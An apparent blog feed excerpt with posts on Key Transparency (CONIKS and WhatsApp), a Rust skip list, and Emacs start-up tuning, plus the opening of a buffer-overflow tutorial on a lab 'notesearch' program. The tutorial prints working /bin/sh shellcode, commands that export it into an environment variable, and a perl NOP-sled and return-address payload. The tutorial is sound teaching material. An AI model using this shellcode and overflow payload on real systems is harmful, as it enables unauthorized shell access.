&lt;li&gt;&lt;a href=&quot;#cross-verification-phase&quot;&gt;Cross verification phase&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#some-thoughts&quot;&gt;Some thoughts&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#how-does-it-work-whatsapp&quot;&gt;How does it work (WhatsApp)?&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#protocol-phases-1&quot;&gt;Protocol phases&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#registration-phase-1&quot;&gt;Registration phase&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#lookup-phase-1&quot;&gt;Lookup phase&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#challenges&quot;&gt;Challenges&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#some-thoughts-1&quot;&gt;Some thoughts&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Context&lt;/h1&gt;
&lt;p&gt;Lately, I&apos;ve been thinking about how current e2e messaging applications
distribute public keys as part of my job. There are two ways. You trust
the service or check that the person you are talking with has the public
key in his possession. The latter is better, but users must use a side
channel (e.g. meet in person, phone call) to check it. That&apos;s known as
Trust On First Use (TOFU). The first time you talk with someone over the
service, you don&apos;t know who they are, but you can use a side channel to
check it. From that point, you know that this person controls that
public key. Unfortunately, this has some disadvantages.&lt;/p&gt;
&lt;p&gt;The main reasons are that users won&apos;t bother performing the flow and
that doing it with every person is a burden. Besides, this doesn&apos;t work
for people who don&apos;t know each other on real life.&lt;/p&gt;
&lt;p&gt;Key Transparency was born.&lt;/p&gt;
&lt;h1&gt;What&apos;s Key Transparency?&lt;/h1&gt;
&lt;p&gt;Key Transparency is a protocol based on append-only logs. The idea is
that the server providing the public keys also gives proofs that it is
behaving correctly. Hence, the public key is correct, and you can safely
talk with the person controlling it.&lt;/p&gt;
&lt;h1&gt;How does it work (CONIKS)?&lt;/h1&gt;
&lt;p&gt;To get an idea, we are going to review the
&lt;a href=&quot;https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/melara&quot;&gt;CONIKS&lt;/a&gt;
implementation.&lt;/p&gt;
&lt;h2&gt;Data Structures&lt;/h2&gt;
&lt;h3&gt;Merkle Tree&lt;/h3&gt;
&lt;p&gt;A &lt;strong&gt;Merkle Tree&lt;/strong&gt; is a tree made of hashes that allows to verify that a
node is in the tree. For example, to check that the tree includes the
hash in red, we only need the hashes in green. Computing the hashes in a
bottom up fashion with the read and green hashes should give us the same
root hash.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/key-transparency-high-level/merkle-tree.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;That&apos;s fast and easy to verify, can be done in the client&apos;s device and
allows any user to check that a specific public key is registered in the
service. This Merkle Tree is computed from time to time, so we end with
root hashes for different &lt;strong&gt;epochs&lt;/strong&gt;. Each new Merkle Tree includes the
previous epoch root hash. These chains prevent forking the history.
Otherwise, the server could build Merkle Trees with malicious intentions
without leaving any trace.&lt;/p&gt;
&lt;h3&gt;User identifier to Public Key map&lt;/h3&gt;
&lt;p&gt;We also need a map between public identifiers and public keys. The
server hosting the information can be untrusted. If the information is
wrong, the client will detect that when verifying the proofs.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Public Identifier&lt;/th&gt;
&lt;th&gt;Public Key&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;6384e2b2184bcbf58eccf10ca7a6563c (alice public id)&lt;/td&gt;
&lt;td&gt;alice pk&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;9f9d51bc70ef21ca5c14f307980a29d8 (bob public id)&lt;/td&gt;
&lt;td&gt;bob pk&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;Protocol phases&lt;/h2&gt;
&lt;h3&gt;Registration phase&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;User creates a new account their device create a new key pair&lt;/li&gt;
&lt;li&gt;Client device creates a new key pair&lt;/li&gt;
&lt;li&gt;Client device sends public key to the server&lt;/li&gt;
&lt;li&gt;Server adds it to the map&lt;/li&gt;
&lt;li&gt;Server computes new Merkle Tree&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;That&apos;s the simplified flow. However, the Merkle Tree isn&apos;t computed for
each new key due to scalability issues. It&apos;s done after specific time
intervals (e.g. every 5 minutes). When the time is right, the server
creates a snapshot of that epoch. That includes all the new keys added
in the last batch.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/key-transparency-high-level/register-phase.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Lookup phase&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Alice asks for the public key of Bob&lt;/li&gt;
&lt;li&gt;Server sends public key and inclusion proof&lt;/li&gt;
&lt;li&gt;Alice verifies the inclusion proof (the given public key is included
in the Merkle Tree)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Alice knows the given public key is inside the Merkle Tree and trusts
that it&apos;s Bob&apos;s public key. If it wasn&apos;t, Bob should have notice and
raised an alarm somewhere.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/key-transparency-high-level/lookup-phase.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Monitoring phase&lt;/h3&gt;
&lt;p&gt;It works the same as the lookup phase. Alice checks that the service
gives her key when someone asks for her public key. Otherwise he can
raise the alarm to her contacts.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/key-transparency-high-level/monitoring-phase.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Cross verification phase&lt;/h3&gt;
&lt;p&gt;Client asks to different providers to verify the Merkle Tree chain.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/key-transparency-high-level/cross-verification-phase.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Some thoughts&lt;/h2&gt;
&lt;p&gt;Pretty cool, right? It&apos;s a good step forward to improve public key
distribution. However, it has it&apos;s
&lt;a href=&quot;https://freedom-to-tinker.com/2016/03/31/why-making-johnnys-key-management-transparent-is-so-challenging/&quot;&gt;challenges&lt;/a&gt;.
What time interval should we use to compute epochs? What happens if a
new user wants to send a message while the epoch is still building? What
if clients can&apos;t ask various providers?&lt;/p&gt;
&lt;p&gt;The biggest problem is that this protocol doesn&apos;t work if the company
owns the messaging channel and the public key distribution server and
there aren&apos;t other providers. We have no assurance that the company
didn&apos;t forge the history. Furthermore, they could add two public keys
for each user. One controlled by the user and one by the server. That
way, they can perform a MITM attack. The server would give the fake key
to any user performing the lookup phase and the real key to any user
performing the monitoring phase.&lt;/p&gt;
&lt;h1&gt;How does it work (WhatsApp)?&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://www.usenix.org/conference/pepr23/presentation/lewi&quot;&gt;WhatsApp started with their own implementation of Key
Transparency&lt;/a&gt;.
It might be of more help than CONIKS implementation. The data structures
are the same, but the phases change a bit.&lt;/p&gt;
&lt;h2&gt;Protocol phases&lt;/h2&gt;
&lt;h3&gt;Registration phase&lt;/h3&gt;
&lt;p&gt;It works the same as in CONIKS.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/key-transparency-high-level/whatsapp-register-phase.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Lookup phase&lt;/h3&gt;
&lt;p&gt;Similar to CONIKS. However, the client first asks for the root hash of
the last published epoch. Then, the client asks WhatsApp for the public
key included in the Merklee Tree with that root hash.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/key-transparency-high-level/whatsapp-lookup-phase.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Challenges&lt;/h2&gt;
&lt;p&gt;We can learn a lot from WhatsApp implementation, especially from the
challenges they had to face.&lt;/p&gt;
&lt;p&gt;First, how can they distribute root hashes consistently? How can the
clients trust they are building Merkle Trees as expected and behaving
honestly? Ideally, with a distributed ledger technology like blockchain.
However, they are not doing it for now. They have locked down server
that the client has to trust. It&apos;s not the best, but a step in the right
direction.&lt;/p&gt;
&lt;p&gt;Second, what happens if we always look up the latest key? The server
could serve a malicious key to Bob, which he will automatically trust.
Ideally, this could be detected with &lt;strong&gt;Key history checks&lt;/strong&gt;. Each user
would monitor that WhatsApp always represented their public key
correctly. However, they didn&apos;t find a way to implement it. Instead,
they use &lt;strong&gt;dual lookup proofs&lt;/strong&gt;. Whenever Alice requests a lookup proof
for Bob, she will also ask one for her own key.&lt;/p&gt;
&lt;h2&gt;Some thoughts&lt;/h2&gt;
&lt;p&gt;That&apos;s a step in the right direction for e2e encryption. We still have
to trust WhatsApp server but I hope this won&apos;t happen in the future.
More importantly, we can learn a lot from their implementation and
challenges in the future.&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Key Transparency protocol brings some solutions to current limitations
on public key distributions along with some challenges. Google and
WhatsApp seem to be doing some work on those areas. Keep a look on
them!!!&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/key-transparency.degZT15k.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Skip List (in Rust) explained!</title><link>https://danielorihuela.dev/blog/skip-list/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/skip-list/</guid><description>Understand Skip Lists in Rust. Simpler than balanced trees, they offer logarithmic operations but use more memory. Learn their structure and how to implement them.</description><pubDate>Sat, 18 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#whats-a-skip-list&quot;&gt;What&apos;s a Skip List?&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#search&quot;&gt;Search&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#insert&quot;&gt;Insert&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#delete&quot;&gt;Delete&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#rust-implementation&quot;&gt;Rust implementation&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#basic-structure&quot;&gt;Basic structure&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#search-1&quot;&gt;Search&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#insert-1&quot;&gt;Insert&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#delete-1&quot;&gt;Delete&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;What&apos;s a Skip List?&lt;/h1&gt;
&lt;p&gt;A Skip List is a probabilistic data structure that serves as an
alternative to balanced trees. They are simpler to implement and provide
logarithmic search, insertion and removal. However, they take up more
memory.&lt;/p&gt;
&lt;p&gt;Regarding the structure, a Skip List is no more than &quot;n&quot; linked lists.
Conceptually, they are stacked on top of each other. For example, the
next image shows a Skip List with four layers.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/skip-list/basic-structure.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Let&apos;s briefly explain how each of the operations works at a high level.
To know all the details, please, read the &lt;a href=&quot;https://15721.courses.cs.cmu.edu/spring2018/papers/08-oltpindexes1/pugh-skiplists-cacm1990.pdf&quot;&gt;original
whitepaper&lt;/a&gt;.
After that, we will see a Rust implementation.&lt;/p&gt;
&lt;h2&gt;Search&lt;/h2&gt;
&lt;p&gt;We start at the topmost layer of the first node. If the next node value
is lower than the value we are searching for, we go forward. Otherwise,
we go downwards. If we repeat this in a loop, we will end at a node in
the bottommost layer. We just need to check if this node contains the
value that we want.&lt;/p&gt;
&lt;p&gt;You can see on the next image, marked with a red line, the path the
algorithm will follow to search for node 762.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/skip-list/search.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;If we search 700, the algorithm would follow the same path until node
641. Since the next node value is 762, which is bigger, it wouldn&apos;t find
the value.&lt;/p&gt;
&lt;h2&gt;Insert&lt;/h2&gt;
&lt;p&gt;As with searching, we go forward if the value is smaller and downwards
if bigger. Now, every time we go downward we will store the pointer of
that node. Once we have found the spot to insert our new node, we will
visit the nodes where we went down in reverse order and update the
successors if the algorithm decides that we need to insert the new node
at that level. That is done randomly.&lt;/p&gt;
&lt;p&gt;For example, let&apos;s say we want to insert the value 700. First, the
algorithm would follow the path marked with a red line in the following
image. It would store nodes with values None, 446, and 641. The new node
will be inserted between 641 and 762. Then, we proceed to visit node 641
and randomly choose if the new node should be a successor. We repeat
that for 446 and None if required.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/skip-list/insert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Delete&lt;/h2&gt;
&lt;p&gt;This is similar to the insert algorithm. Now, instead of adding a new
node, we will visit each node where we went downwards and update the
successors to remove the node.&lt;/p&gt;
&lt;h1&gt;Rust implementation&lt;/h1&gt;
&lt;p&gt;You can see the full implementation
&lt;a href=&quot;https://github.com/danielorihuela/algorithms-and-data-structures/blob/master/list/skip_list/src/main.rs&quot;&gt;https://github.com/danielorihuela/algorithms-and-data-structures/blob/master/list/skip_list/src/main.rs&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Important details for those who want to implement it on Rust.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;You can see &lt;a href=&quot;https://github.com/JP-Ellis/rust-skiplist&quot;&gt;https://github.com/JP-Ellis/rust-skiplist&lt;/a&gt; an advanced
implementation.&lt;/li&gt;
&lt;li&gt;Building linked lists on Rust is unusually hard. Check
&lt;a href=&quot;https://rust-unofficial.github.io/too-many-lists/&quot;&gt;https://rust-unofficial.github.io/too-many-lists/&lt;/a&gt; first.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Basic structure&lt;/h2&gt;
&lt;p&gt;Take into account that we need to init all &quot;forward&quot; vectors to be of
length &quot;max_level&quot; to identify the next node of the current layer.
Otherwise, you might end up changing from the linked list on layer 3 to
the linked list on layer 2 without your knowledge.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;struct SkipList&amp;lt;T&amp;gt; {
    head: NonNull&amp;lt;Node&amp;lt;T&amp;gt;&amp;gt;,
    max_level: usize,
}

type Link&amp;lt;T&amp;gt; = Option&amp;lt;NonNull&amp;lt;Node&amp;lt;T&amp;gt;&amp;gt;&amp;gt;;

#[derive(Clone, Debug)]
struct Node&amp;lt;T&amp;gt; {
    // If the value is None, this is the sentinel value
    value: Option&amp;lt;T&amp;gt;,
    forward: Vec&amp;lt;Link&amp;lt;T&amp;gt;&amp;gt;,
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Search&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;fn search(&amp;amp;self, v: &amp;amp;T) -&amp;gt; bool {
    let mut node = self.head;

    // Go downwards
    for i in (0..self.max_level).rev() {
        let mut next = get_forward(node)[i];

        // If value is lower, go forward
        while next.and_then(value).is_some_and(|value| &amp;amp;value &amp;lt; v) {
            node = next.unwrap();
            next = get_forward(node)[i];
        }
    }

    let node = get_forward(node)[0];
    node.map(value).is_some_and(|n| n.as_ref() == Some(v))
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Insert&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;fn insert(&amp;amp;mut self, v: &amp;amp;T) {
    let mut update = vec![None; self.max_level];
    let mut node = self.head;

    // Go downwards
    for i in (0..self.max_level).rev() {
        let mut next = get_forward(node)[i];

        // If value is lower, go forward
        while next.and_then(value).is_some_and(|value| &amp;amp;value &amp;lt; v) {
            node = next.unwrap();
            next = get_forward(node)[i];
        }

        // Store nodes where we went downwards
        update[i] = Some(node);
    }

    let node = get_forward(node)[0];
    if node.map(value).is_some_and(|n| n.as_ref() == Some(v)) {
        println!(&quot;{} is already in the list&quot;, v);
    }

    let level = rand::thread_rng().gen_range(0..self.max_level);
    let mut x = unsafe {
        NonNull::new_unchecked(Box::into_raw(Box::new(Node {
            value: Some(v.clone()),
            forward: vec![None; self.max_level],
        })))
    };

    // For each node where we went downwards
    for i in 0..=level {
        // Update the successors accordingly
        if update[i].is_none() {
            get_forward_mut(&amp;amp;mut x)[i] = get_forward(self.head)[i];
            get_forward_mut(&amp;amp;mut self.head)[i] = Some(x);
        } else {
            get_forward_mut(&amp;amp;mut x)[i] = get_forward(update[i].unwrap())[i];
            get_forward_mut(&amp;amp;mut update[i].unwrap())[i] = Some(x);
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Delete&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;fn delete(&amp;amp;mut self, v: &amp;amp;T) {
    let mut update = vec![None; self.max_level];
    let mut node = self.head;

    // Go downwards
    for i in (0..self.max_level).rev() {
        let mut next = get_forward(node)[i];

        // If value is lower, go forward
        while next.and_then(value).is_some_and(|value| &amp;amp;value &amp;lt; v) {
            node = next.unwrap();
            next = get_forward(node)[i];
        }

        // Store nodes where we went downwards
        update[i] = Some(node);
    }

    let node = get_forward(node)[0];
    if node.map(value).is_some_and(|n| n.as_ref() == Some(v)) {

        // For each node where we went downwards
        for i in 0..self.max_level {
            if let Some(mut update_i) = update[i] {
                if get_forward(update_i)[i] != node {
                    break;
                } else {
                    // Update the successors accordingly
                    get_forward_mut(&amp;amp;mut update_i)[i] = get_forward(node.unwrap())[i];
                }
            }
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/skip-list.BnqtRHBJ.jpg</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Optimize emacs start up time</title><link>https://danielorihuela.dev/blog/optimize-emacs-start-up-time/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/optimize-emacs-start-up-time/</guid><description>Frustrated with Emacs start-up times? Discover simple hacks to speed things up and enhance your workflow in this guide.</description><pubDate>Sat, 18 Nov 2023 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#optimization-steps&quot;&gt;Optimization steps&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#base-configuration&quot;&gt;Base configuration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#dont-manipulate-ui-in-init.el&quot;&gt;Don&apos;t manipulate UI in init.el&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#garbage-collector&quot;&gt;Garbage collector&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#disable-ui&quot;&gt;Disable UI&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#autoload-packages&quot;&gt;Autoload packages&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#tangle-org-file&quot;&gt;Tangle org file&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Emacs is a great tool. However, its loading time can grow huge. In this
post, I&apos;ll show you some configurations that helped me reduce the start
up time from &lt;strong&gt;~2.45s&lt;/strong&gt; to &lt;strong&gt;~0.81s&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Optimization steps&lt;/h1&gt;
&lt;p&gt;To make it more interesting, I&apos;m going to add a section for each
optimization along with the time it saved me. That way, you can decide
which optimizations you would like to apply.&lt;/p&gt;
&lt;h2&gt;Base configuration&lt;/h2&gt;
&lt;p&gt;The &lt;a href=&quot;https://github.com/danielorihuela/dotfiles/blob/master/emacs/config.org&quot;&gt;base
configuration&lt;/a&gt;
requires ~2.45s to initialize Emacs. If you check it, be aware that I&apos;m
not tangling the section &lt;strong&gt;Writing Research in LaTeX&lt;/strong&gt;. If you tangle
it, it needs even more time to load. That&apos;s the starting point.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/speed-up-emacs-init/base.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Don&apos;t manipulate UI in init.el&lt;/h2&gt;
&lt;p&gt;Manipulating the UI is expensive: disabling UI elements, modifying the
font, the theme, etc. I changed a couple of things related to the UI.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Remove the code that hides some of the default UI elements from
Emacs.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(scroll-bar-mode -1)
(tool-bar-mode -1)
(tooltip-mode -1)
(menu-bar-mode -1)
(column-number-mode)
(set-face-attribute &apos;default nil :height 180)
(toggle-frame-maximized)
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Remove the code that loads the theme.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(use-package flatland-theme
  :config
  (load-theme &apos;flatland t))
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;With that, we go down to ~2s.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/speed-up-emacs-init/no-ui.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Garbage collector&lt;/h2&gt;
&lt;p&gt;Emacs uses 8MB as the default value for the garbage collector. As a
result, Emacs will call the garbage collector too many times during the
start up. Doom emacs has a trick to improve that. We need to add the
following code to &lt;code&gt;early-init.el&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(setq gc-cons-threshold 63000000
      gc-cons-percentage 0.6)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With that, we go down to ~1.021s. Half the time from the previous step.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/speed-up-emacs-init/early-init-gc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Disable UI&lt;/h2&gt;
&lt;p&gt;We can hide some UI elements in the &lt;code&gt;early-init.el&lt;/code&gt; to gain some
performance.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(push &apos;(menu-bar-lines . 0) default-frame-alist)
(push &apos;(tool-bar-lines . 0) default-frame-alist)
(push &apos;(vertical-scroll-bars) default-frame-alist)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With that, we go down to ~0.92s.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/speed-up-emacs-init/early-init-disable-ui.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Autoload packages&lt;/h2&gt;
&lt;p&gt;Never &lt;code&gt;require&lt;/code&gt; packages. Use &lt;code&gt;use-package&lt;/code&gt; to autoload them. For
example, we can load the &lt;code&gt;magit&lt;/code&gt; the first time we call &lt;code&gt;magit-status&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(use-package magit
  :bind (&quot;C-x g&quot; . magit-status))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With that, we go down to ~0.91s. It&apos;s anecdotal in my case, but it can
save you a lot of time if you are using dozens or hundreds of packages.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/speed-up-emacs-init/config-org-autoload.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Tangle org file&lt;/h2&gt;
&lt;p&gt;Normally, Emacs reads the configuration from the &lt;code&gt;init.el&lt;/code&gt; file.
However, we can use org mode to include comments with the code.
Personally, I had my configuration in a file called &lt;code&gt;config.org&lt;/code&gt;. I
loaded it from my &lt;code&gt;init.el&lt;/code&gt; with the following line of code:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(org-babel-load-file &quot;~/dotfiles/emacs/config.org&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It&apos;s pretty convenient, but slow. We can make it faster by tangling the
file directly into the &lt;code&gt;init.el&lt;/code&gt;. In other words, we can extract the
source code blocks from the &lt;code&gt;org&lt;/code&gt; file and create the &lt;code&gt;init.el&lt;/code&gt; with
them.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# -*- after-save-hook: (org-babel-tangle) -*-
#+property: header-args:elisp :exports code :results none :tangle init.el
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With that, we go down to ~0.82s and get the &lt;a href=&quot;https://github.com/danielorihuela/dotfiles/blob/master/emacs/config.org&quot;&gt;final
config&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/speed-up-emacs-init/config-org-tangle.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Emacs is easy to configure, but hard to optimize. Try all the tricks
above and check for some more on the internet.&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/emacs-logo.DuuBcpPG.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Store shellcode in environment variable</title><link>https://danielorihuela.dev/blog/store-shellcode-in-environment-variable/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/store-shellcode-in-environment-variable/</guid><description>Learn how to store the shellcode in an environment variable and bypass size limitations in buffer overflows.</description><pubDate>Sun, 29 Oct 2023 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#manually-store-shellcode-in-env-var&quot;&gt;Manually store shellcode in env
var&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#automating-the-attack&quot;&gt;Automating the attack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In the &lt;a href=&quot;../stack-based-buffer-overflows&quot;&gt;previous post&lt;/a&gt; we explained how
stack-based buffer overflows work. In the last exercise, we inserted the
shellcode in the stack. However, this might be a problem. What happens
if the shellcode doesn&apos;t fit in the stack? We can store it in an
environment variable.&lt;/p&gt;
&lt;h1&gt;Manually store shellcode in env var&lt;/h1&gt;
&lt;p&gt;We will export the shellcode manually and use it in our exploit.&lt;/p&gt;
&lt;p&gt;Let&apos;s keep working with the &lt;code&gt;notesearch&lt;/code&gt; program (the last exercise of
the previous post). Remember that the shellcode was
&lt;code&gt;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&lt;/code&gt;.
We need to export it as a binary into the env var. Otherwise, the code
won&apos;t be executed.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo -e &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot; &amp;gt; shellcode.bin
export SHELLCODE=$(cat shellcode.bin)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The terminal will complain about the encoding but don&apos;t worry. It&apos;s
still working.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow-env-var/wrong-encoding.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The next step is debugging the exploit and searching the address where
the environment variable is in the stack. Environment variables are in
the lowest positions.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;env gdb ~/Desktop/overflow/notesearch
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can place a break in the main function to inspect the stack frame.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow-env-var/shellcode-location-env-var.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The shellcode is at &lt;code&gt;0x7fffffffe975&lt;/code&gt;. Notice that if the user adds or
removes environment variables, the memory address will change. We can
execute
&lt;code&gt;~/Desktop/overflow/notesearch $(perl -e &apos;print &quot;\x90&quot; x 120, &quot;\x75\xe9\xff\xff\xff\x7f&quot;&apos;)&lt;/code&gt;.
Remember, we use the first 120 bytes to reach the return address memory
location.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow-env-var/manual-exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Automating the attack&lt;/h1&gt;
&lt;p&gt;Another advantage of storing the shellcode in an environment variable is
that automating the attack is easier. C
&lt;a href=&quot;https://linux.die.net/man/3/execl&quot;&gt;execle&lt;/a&gt; function allows to execute
files with the given arguments and environment variables.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;int execle(const char *path, const char *arg,..., char * const envp[]);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can execute the binary with just the shellcode in the environment
variables. Hence, we get rid of other environment variables that could
